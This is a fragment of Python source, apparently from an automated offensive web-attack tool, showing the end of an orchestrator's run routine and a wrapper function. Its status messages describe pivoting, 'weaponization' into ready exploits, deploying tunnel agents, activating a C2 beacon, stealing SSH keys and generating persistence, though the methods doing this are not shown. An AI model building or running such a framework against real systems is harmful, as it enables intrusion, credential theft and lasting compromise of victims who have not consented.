        print("[*] Phase 6/7: Attack chain pivoting ...")
        pivot_result = self.phase_pivot()
        pivot_actions = len(pivot_result.get("pivot_actions", []))
        if pivot_actions:
            print("  -> %d chain pivot actions executed" % pivot_actions)
        else:
            print("  -> No chain pivots triggered")

        if findings or ab_total > 0:
            if self.high_priv_sess:
                print("[*] Phase 6b/7: Dual-session BOLA detection ...")
                self.phase_dual_session()
            print("[*] Phase 7/7: Weaponization (%d threads) ..." % self.threads)
            exploits = self.phase_weaponize()
            ex_ready = len([e for e in exploits.values() if e.get("exploit_ready")])
            print("  -> %d exploit paths (%d ready)" % (len(exploits), ex_ready))

        if exploits:
            print("[*] Phase 8/7: Advanced exploitation (tunnel/C2/lateral) ...")
            adv = self.phase_advanced(exploits)
            if adv.get("tunnels"):
                print("  -> %d tunnel agents deployed" % len(adv["tunnels"]))
            if adv.get("c2_active"):
                print("  -> C2 beacon agent active")
            if adv.get("ssh_keys"):
                print("  -> %d SSH keys stolen" % len(adv["ssh_keys"]))
            if adv.get("post_exploit"):
                print("  -> Post-exploitation persistence generated")

        report = self.phase_report()
        self.oob_server.stop()
        report["elapsed_seconds"] = round(time.time() - start, 1)
        self.state["report"] = report
        return report


def run(target: str, sess: Optional['requests.Session'] = None,
        timeout: float = 10.0, threads: int = 10,
        high_priv_sess: Optional['requests.Session'] = None,
        fast_recon: bool = True, time_budget: Optional[float] = None,
        high_value: bool = False) -> Dict:
    o = Orchestrator(target, sess, timeout, threads,
                     high_priv_sess=high_priv_sess, fast_recon=fast_recon,
                     time_budget=time_budget, high_value=high_value)
    return o.run()
